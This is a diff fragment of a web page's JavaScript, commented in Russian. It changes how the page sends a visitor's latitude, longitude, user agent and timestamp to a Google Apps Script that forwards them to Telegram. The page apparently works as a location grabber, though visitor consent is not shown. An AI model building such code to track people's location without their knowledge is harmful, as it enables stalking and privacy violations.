@@ -144,20 +144,20 @@
                 timestamp: new Date().toISOString()
             };
         
-            // Используем GET запрос вместо POST для обхода CORS
-            const params = new URLSearchParams();
-            params.append('lat', lat);
-            params.append('lon', lon);
-            params.append('userAgent', navigator.userAgent);
-            params.append('timestamp', new Date().toISOString());
-        
-            fetch(GOOGLE_SCRIPT_URL + '?' + params.toString(), {
-                method: 'GET',
-                mode: 'no-cors' // Добавляем этот параметр
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
             })
-            .then(response => {
-                // При mode: 'no-cors' мы не можем прочитать ответ, но запрос уйдет
-                console.log('✅ Координаты отправлены в Telegram');
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log('✅ Координаты отправлены в Telegram');
+                } else {
+                    console.error('❌ Ошибка отправки:', data.error);
+                }
             })
             .catch(error => {
                 console.error('❌ Ошибка сети:', error);
@@ -219,4 +219,5 @@
 </body>
 
 </html>
+
 
